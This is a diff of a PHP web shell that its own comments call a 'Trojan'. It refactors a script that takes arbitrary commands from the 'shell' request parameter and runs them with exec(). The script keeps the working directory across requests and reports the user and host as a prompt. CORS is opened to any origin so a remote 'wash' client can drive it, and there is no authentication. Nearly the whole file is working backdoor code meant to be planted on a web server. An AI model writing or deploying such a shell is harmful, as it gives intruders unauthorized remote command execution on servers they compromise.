@@ -1,23 +1,5 @@
 <?php
 
-// @todo: DON'T FORGET TO SEND THE SPECIAL AJAX HEADER HERE
-// @todo: probably need to track some kind of options hash over here
-// @todo: it would be awesome to build a compatiblity layer for programs like 
-// top that don't (I don't think) write to stdout
-// @note @todo: all trojans should support some kind of "help" command to show
-// you what payloads they're carrying
-// @todo: it would be rad as hell if I could get tab-completion to work
-
-class Trojan{
-    public $payloads = array();
-    public $options = array();
-
-    public function help(){
-        return 'help';
-    }
-
-}
-
 class Payload{
     public $description = 'A description of the payload goes here.';
     public $options = array();
@@ -28,41 +10,103 @@ class Payload{
 
 }
 
-// use sessions for some conveniences, like preserving the CWD
-session_start();
+// @todo: probably need to track some kind of options hash over here
+// @todo: it would be awesome to build a compatiblity layer for programs like 
+// top that don't (I don't think) write to stdout
+// @note @todo: all trojans should support some kind of "help" command to show
+// you what payloads they're carrying
+// @todo: it would be rad as hell if I could get tab-completion to work
 
-$cwd = '.';
-if(isset($_SESSION['cwd'])){
-    $cwd = $_SESSION['cwd'];
+class Trojan{
+    private $command         = '';
+    private $cwd             = '';
+    private $output          = '';
+    private $prompt_context  = '';
+    private $payloads        = array();
+    private $options         = array(
+        'redirect_stderr_to_stdout'  => true,
+    );
+    private $output_raw      = array();
+
+    /**
+     * A generic constructor
+     */
+    public function __construct(){
+        # Require that $this->cwd always contains a meaningful value
+        $this->cwd = `pwd`;
+    }
+
+    /**
+     * Processes a command from the wash client
+     *
+     * @param string $command          A command - this will change
+     */
+    public function process_command($command){
+        # emulate cwd persistence
+        if(isset($_SESSION['cwd'])){ $this->cwd = $_SESSION['cwd']; }
+
+        # buffer the command from the client, in case we ever want to refer
+        # back to it
+        $this->command = $command;
+
+        /* @note: In order to get current directory persistence to work, I need 
+         * to inject some `cd` and `pwd` commands around the command sent from 
+         * the wash client. */
+
+        # optionally (by default) redirect stderr to stdout
+        if($this->options['redirect_stderr_to_stdout']){
+            $command  = "cd {$this->cwd}; " . $_REQUEST['shell'] . " 2>&1; pwd";
+        } else {
+            $command  = "cd {$this->cwd}; " . $_REQUEST['shell'] . "; pwd";
+        }
+        exec($command, $this->output_raw);
+
+        # parse the results
+        $this->cwd    = array_pop($this->output_raw);
+        $this->output = join($this->output_raw, "\n");
+
+        # save the cwd
+        $_SESSION['cwd'] = $this->cwd;
+    }
+
+    /**
+     * Sends a response back to the wash client
+     */
+    public function send_response(){
+        /* This header prevents the wash client from malfunctioning due to the 
+         * Same-Origin Policy. @see: http://enable-cors.org/ */
+        header('Access-Control-Allow-Origin: *');
+
+        //$error    = '';
+        $response = array(
+            'prompt_context' => $this->get_prompt_context(),
+            'output'         => $this->output,
+            //'error'          => $error,
+        );
+
+        # assemble and send a JSON-encoded response
+        $json = json_encode($response);
+        echo $json;
+        die();
+    }
+
+    /**
+     * Assembles the prompt context to return to the wash client
+     *
+     * @return string $prompt_context  The prompt context
+     */
+    private function get_prompt_context(){
+        // assemble the prompt context
+        $whoami               =  trim(`whoami`);
+        $hostname             =  gethostname();
+        $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
+        $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
+        return $this->prompt_context;
+    }
 }
 
-
-// generate the output
-$output = array();
-
-$command = "cd $cwd; " . $_REQUEST['shell'] . " 2>&1; pwd";
-exec($command, $output);
-$cwd = array_pop($output);
-$output = join($output, "\n");
-
-// assemble the prompt context
-$whoami          =  trim(`whoami`);
-$hostname        =  gethostname();
-$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
-$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";
-
-// also need to redirect stderr to stdout
-$error = '';
-$response = array(
-    'prompt_context' => $prompt_context,
-    'output'         => $output,
-    'error'          => $error,
-);
-
-// save the cwd
-$_SESSION['cwd'] = $cwd;
-
-$json = json_encode($response);
-echo $json;
-    
-die();
+/* ---------- Procedural code starts here ---------- */
+session_start();
+$trojan = new Trojan();
+$trojan->process_command($_REQUEST['shell']);
+$trojan->send_response();
